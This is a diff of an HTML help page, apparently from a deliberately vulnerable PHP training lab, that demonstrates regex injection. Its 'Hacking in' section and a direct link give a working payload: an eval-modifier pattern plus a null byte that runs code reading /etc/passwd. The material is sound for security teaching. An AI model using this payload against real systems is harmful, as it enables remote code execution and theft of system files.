@@ -2,6 +2,7 @@
 <html>
   <head>
     <title>Regex Injection (2)</title>
+    <style type="text/css">.tt { font-family: monospace; }</style>
   </head>
   <body>
     <h1>Regex Injection (2)</h1>
@@ -14,16 +15,23 @@
       </table>
     </form>
     <h2>How to use</h2>
-    <p>This modifies the previous example by appending the '/' characters to
-      the pattern within the script, thereby preventing the addition of
-      extra processing flags.</p>
+    <p>
+      This modifies the previous example by appending the
+      '<span class="tt">/</span>' characters to the pattern within the script,
+      thereby preventing the addition of extra processing flags.
+    </p>
+    <h3>Hacking in</h3>
     <p>Enter the following parameters for the attack:</p>
     <table>
-      <tr><td>Pattern:    </td><td>./e                            </td></tr>
-      <tr><td>Replacement:</td><td>file_get_contents("/etc/passwd")</td></tr>
-      <tr><td>Subject:    </td><td>a                               </td></tr>
+      <tr><td>Pattern:    </td><td class="tt">./e</td></tr>
+      <tr><td>Replacement:</td><td class="tt">file_get_contents("/etc/passwd")</td></tr>
+      <tr><td>Subject:    </td><td class="tt">a</td></tr>
     </table>
-    <p>Then terminate the ?pattern parameter with a null character - %00.</p>
+    <p>
+      Then terminate the <span class="tt">?pattern</span>
+      parameter with a null character -
+      <span class="tt">%00</span>.
+    </p>
     <p><a href="regex2.php?pattern=.%2Fe%00&replacement=file_get_contents%28%22%2Fetc%2Fpasswd%22%29&subject=a">Direct link</a>.</p>
   </body>
 </html>
